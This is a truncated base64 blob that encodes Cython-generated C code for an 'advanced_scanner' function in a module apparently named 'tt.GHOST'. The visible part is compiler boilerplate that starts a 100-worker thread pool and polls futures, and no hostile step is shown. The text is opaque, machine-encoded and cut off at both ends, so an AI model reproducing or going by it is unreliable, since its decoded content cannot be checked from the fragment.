9zZWxmID0gdmFsdWVzWzBdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiYWR2YW5jZWRfc2Nhbm5lciIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5hZHZhbmNlZF9zY2FubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMnR0XzVHSE9TVF8yOGFkdmFuY2VkX3NjYW5uZXIoX19weXhfc2VsZiwgX19weXhfdl9zZWxmKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJ0dF81R0hPU1RfMTZhZHZhbmNlZF9zY2FubmVyXzJnZW5lcmF0b3IzKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyBcblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8xNmFkdmFuY2VkX3NjYW5uZXJfZ2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApO1xuICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHtcbiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMnR0XzVHSE9TVF8xNmFkdmFuY2VkX3NjYW5uZXJfMmdlbmVyYXRvcjMsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1RfYWR2YW5jZWRfc2Nhbm5lcl9sb2NhbHNfZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmFkdmFuY2VkX3NjYW5uZXIuZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMnR0XzVHSE9TVF8xNmFkdmFuY2VkX3NjYW5uZXJfMmdlbmVyYXRvcjMoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgXG57XG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5X3NzaXplX3QgX19weXhfdF8yO1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfMztcbiAgaW50IF9fcHl4X3RfNDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIGludCBfX3B5eF90XzY7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfdF85O1xuICBpbnQgX19weXhfdF8xMDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApO1xuICBzd2l0Y2ggKF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsKSB7XG4gICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjtcbiAgICBjYXNlIDE6IGdvdG8gX19weXhfTDdfcmVzdW1lX2Zyb21feWllbGQ7XG4gICAgZGVmYXVsdDogXG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIE5VTEw7XG4gIH1cbiAgX19weXhfTDNfZmlyc3RfcnVuOjtcbiAgaWYgKHVubGlrZWx5KF9fcHl4X3NlbnRfdmFsdWUgIT0gUHlfTm9uZSkpIHtcbiAgICBpZiAodW5saWtlbHkoX19weXhfc2VudF92YWx1ZSkpIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJjYW5cJ3Qgc2VuZCBub24tTm9uZSB2YWx1ZSB0byBhIGp1c3Qtc3RhcnRlZCBnZW5lcmF0b3IiKTtcbiAgICBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICBfX3B5eF90XzIgPSAwO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpIH1cbiAgX19weXhfdF81ID0gX19QeXhfZGljdF9pdGVyYXRvcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZXMsICgmX19weXhfdF8zKSwgKCZfX3B5eF90XzQpKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF8xID0gX19weXhfdF81O1xuICBfX3B5eF90XzUgPSAwO1xuICB3aGlsZSAoMSkge1xuICAgIF9fcHl4X3RfNiA9IF9fUHl4X2RpY3RfaXRlcl9uZXh0KF9fcHl4X3RfMSwgX19weXhfdF8zLCAmX19weXhfdF8yLCBOVUxMLCAmX19weXhfdF81LCBOVUxMLCBfX3B5eF90XzQpO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF90XzYgPT0gMCkpIGJyZWFrO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF90XzYgPT0gLTEpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9mdXR1cmUpO1xuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9mdXR1cmUsIF9fcHl4X3RfNSk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzUpO1xuICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgX19weXhfdF83ID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2Z1dHVyZTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAwO1xuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9O1xuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9uZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMS1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgfVxuICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19weXhfdF8xMCA9ICghX19weXhfdF85KTtcbiAgICBpZiAoX19weXhfdF8xMCkge1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xKTtcbiAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3RfMCA9IF9fcHl4X3RfMTtcbiAgICAgIF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8xID0gX19weXhfdF8yO1xuICAgICAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF90XzIgPSBfX3B5eF90XzM7XG4gICAgICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3RfMyA9IF9fcHl4X3RfNDtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAgICAgXG4gICAgICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IDE7XG4gICAgICByZXR1cm4gX19weXhfcjtcbiAgICAgIF9fcHl4X0w3X3Jlc3VtZV9mcm9tX3lpZWxkOjtcbiAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8wO1xuICAgICAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF90XzAgPSAwO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19weXhfdF8yID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF90XzE7XG4gICAgICBfX3B5eF90XzMgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3RfMjtcbiAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8zO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpXG4gICAgfVxuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIGlmIChfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbigwKTtcbiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgfVxuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICAjaWYgIUNZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oX19weXhfZ2VuZXJhdG9yKTtcbiAgI2VuZGlmXG4gIF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsID0gLTE7XG4gIF9fUHl4X0Nvcm91dGluZV9jbGVhcigoUHlPYmplY3QqKV9fcHl4X2dlbmVyYXRvcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8yOGFkdmFuY2VkX3NjYW5uZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZikge1xuICBQeU9iamVjdCAqX19weXhfdl9leGVjdXRvciA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Z1dHVyZV90b193b3JrZXIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl93b3JrZXJfaWQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9hY3RpdmVfd29ya2VycyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Z1dHVyZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9nYl8ydHRfNUdIT1NUXzE2YWR2YW5jZWRfc2Nhbm5lcl8yZ2VuZXJhdG9yMyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzU7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMO1xuICBpbnQgX19weXhfdF8xMztcbiAgUHlfc3NpemVfdCBfX3B5eF90XzE0O1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfMTU7XG4gIGludCBfX3B5eF90XzE2O1xuICBpbnQgX19weXhfdF8xNztcbiAgaW50IF9fcHl4X3RfMTg7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjAgPSBOVUxMO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJhZHZhbmNlZF9zY2FubmVyIiwgMCk7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQyNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDI1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICBfX3B5eF90XzUgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7XG4gICAgYXNzZXJ0KF9fcHl4X3RfMik7XG4gICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfNSA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMn07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQyNSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gICB7XG4gICAgX19weXhfdF80ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RocmVhZFBvb2xFeGVjdXRvcik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19weXhfdF81ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7XG4gICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfNCk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMSA6IDApXSA9IHtfX3B5eF90XzQsIE5VTEx9O1xuICAgICAgX19weXhfdF8zID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbWF4X3dvcmtlcnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMDAsIF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrMSwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19weXhfdF8xID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKChQeU9iamVjdCopX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgxLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIH1cbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fcHl4X3RfMyA9IE5VTEw7XG4gICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDNfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19weXhfdF81ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgX19weXh